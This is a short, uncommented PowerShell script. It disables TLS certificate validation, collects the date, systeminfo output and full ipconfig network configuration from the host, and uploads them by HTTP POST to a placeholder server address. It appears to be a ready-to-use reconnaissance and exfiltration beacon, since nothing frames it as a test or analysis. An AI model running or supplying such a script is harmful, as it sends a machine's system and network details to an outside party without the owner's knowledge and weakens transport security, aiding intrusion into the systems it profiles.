Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class T : ICertificatePolicy {
public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,int p){return true;}
}
"@
[Net.ServicePointManager]::CertificatePolicy = New-Object T

$b = New-Object -TypeName System.Text.StringBuilder
[void]$b.AppendLine("=D=")
[void]$b.AppendLine((date | Out-String))
[void]$b.AppendLine("`n=S=")
[void]$b.AppendLine((systeminfo | Out-String))
[void]$b.AppendLine("`n=I=")
[void]$b.AppendLine((ipconfig /all | Out-String))

$z = "https://<UPDATE IP OF SERVER HERE>/upload"
$utf8 = [System.Text.Encoding]::UTF8
$bytes = $utf8.GetBytes($b.ToString())

Invoke-RestMethod -Uri $z -Method Post -Body $bytes -ContentType "text/plain" -UseBasicParsing
